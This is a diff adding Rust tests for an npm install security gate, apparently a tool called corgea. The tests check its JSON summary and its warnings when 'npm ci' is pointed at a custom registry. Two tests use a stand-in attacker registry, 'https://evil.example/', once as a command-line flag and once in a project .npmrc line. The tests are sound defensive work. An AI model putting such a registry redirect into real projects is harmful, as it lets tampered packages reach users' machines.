@@ -65,6 +65,33 @@ fn npm_ci_clean_lockfile_proceeds() {
 }
 
 #[test]
+fn npm_ci_clean_lockfile_json_summary_counts_the_tree() {
+    // A lockfile install has no named outcomes, so a clean `npm ci` must
+    // report its checked packages under `summary.tree`, not as an all-zero
+    // summary. `named` stays empty; `tree` reconciles against the lockfile.
+    let mut h = GateHarness::new()
+        .fake_recorder("npm", 0)
+        .vuln_checks(HashMap::new())
+        .with_project_file("package.json", PACKAGE_JSON)
+        .with_project_file("package-lock.json", NPM_LOCK)
+        .build();
+    let out = h
+        .cmd
+        .args(["npm", "--json", "ci"])
+        .output()
+        .expect("run corgea");
+    assert_eq!(out.status.code(), Some(0), "clean lockfile must proceed");
+    let parsed: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("stdout must be valid JSON");
+    let summary = &parsed["summary"];
+    assert_eq!(summary["tree"]["resolved_count"], 2);
+    assert_eq!(summary["tree"]["clean"], 2);
+    assert_eq!(summary["tree"]["vulnerable"], 0);
+    assert_eq!(summary["named"]["ok"], 0);
+    assert_eq!(summary["named"]["clean"], 0);
+}
+
+#[test]
 fn npm_ci_unparsable_lockfile_refuses_without_force() {
     let mut h = GateHarness::new()
         .fake_recorder("npm", 0)
@@ -200,6 +227,56 @@ fn npm_ci_root_redirect_refuses_without_force() {
     assert_eq!(
         h.recorded_argv().as_deref(),
         Some("ci --prefix /tmp/other-project")
+    );
+}
+
+#[test]
+fn npm_ci_registry_flag_warns_then_proceeds() {
+    // `npm ci --registry <url>` pulls tarballs from the override while the
+    // gate verdicts the lockfile against the default registry — warn, but
+    // still proceed on a clean lockfile.
+    let mut h = GateHarness::new()
+        .fake_recorder("npm", 0)
+        .vuln_checks(HashMap::new())
+        .with_project_file("package.json", PACKAGE_JSON)
+        .with_project_file("package-lock.json", NPM_LOCK)
+        .build();
+    let out = h
+        .cmd
+        .args(["npm", "ci", "--registry", "https://evil.example/"])
+        .output()
+        .expect("run corgea");
+    assert_eq!(out.status.code(), Some(0), "clean lockfile must proceed");
+    assert_eq!(
+        h.recorded_argv().as_deref(),
+        Some("ci --registry https://evil.example/")
+    );
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("--registry") && stderr.contains("custom registry"),
+        "npm ci --registry must warn: {stderr}"
+    );
+}
+
+#[test]
+fn npm_ci_npmrc_registry_warns_then_proceeds() {
+    // A project `.npmrc` `registry=` line silently redirects resolution; the
+    // gate copies it into its temp dir so resolution honours the override, yet
+    // verdicts against the default registry — warn on it.
+    let mut h = GateHarness::new()
+        .fake_recorder("npm", 0)
+        .vuln_checks(HashMap::new())
+        .with_project_file("package.json", PACKAGE_JSON)
+        .with_project_file("package-lock.json", NPM_LOCK)
+        .with_project_file(".npmrc", "registry=https://evil.example/\n")
+        .build();
+    let out = h.cmd.args(["npm", "ci"]).output().expect("run corgea");
+    assert_eq!(out.status.code(), Some(0), "clean lockfile must proceed");
+    assert_eq!(h.recorded_argv().as_deref(), Some("ci"));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains(".npmrc") && stderr.contains("custom registry"),
+        "project .npmrc registry override must warn: {stderr}"
     );
 }
 
